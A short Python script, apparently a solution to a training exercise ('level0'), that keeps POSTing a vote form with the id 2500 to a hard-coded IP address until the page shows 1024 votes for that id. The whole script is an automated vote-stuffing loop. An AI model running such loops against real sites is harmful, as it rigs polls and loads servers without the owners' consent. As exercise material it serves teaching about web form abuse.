#!/usr/bin/python3
import requests

URL = 'http://158.69.76.135/level0.php'
ID = '2500'

payload = {'id': ID, 'holdthedoor': 'submit'}
check = ID + "    </td>\n    <td>\n1024"

r = requests.get(URL)
while check not in r.text:
    r = requests.post(URL, data=payload)

print("Done")
